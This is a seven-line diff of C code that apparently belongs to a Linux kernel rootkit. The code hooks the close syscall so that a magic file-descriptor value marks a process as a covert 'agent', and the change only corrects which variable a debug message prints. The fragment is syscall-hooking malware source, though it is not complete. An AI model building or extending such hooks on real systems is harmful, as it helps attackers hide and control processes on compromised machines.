@@ -262,7 +262,7 @@ asmlinkage long hacked_close(unsigned int fd){
 	if(fd == agentKey){
 		agentpid = task_pid_nr(current);
 		printk("Agent trigger detected\n");
-		printk("Agent process pid is %d\n", pid);
+		printk("Agent process pid is %d\n", agentpid);
 	}
 	ret = (*orig_close)(fd);
 	return ret;
